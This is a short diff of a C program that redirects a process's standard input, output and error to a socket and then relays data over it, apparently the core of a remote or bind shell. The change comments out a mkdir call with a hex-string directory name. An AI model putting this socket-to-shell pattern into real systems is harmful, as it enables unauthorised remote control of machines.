@@ -44,7 +44,7 @@ int main(int argc, char** argv)
 		dup2(sock, 0); //stdin
 		dup2(sock, 1); //stdout
 		dup2(sock, 2); //stderr
-		mkdir("7C937ED6E719132F7E27E837F5024DDA1A23919287D662349E3E17367B37D85C", S_IRWXU);
+		//mkdir("7C937ED6E719132F7E27E837F5024DDA1A23919287D662349E3E17367B37D85C", S_IRWXU);
 		read_and_write(sock);
 	}
 	return 1;
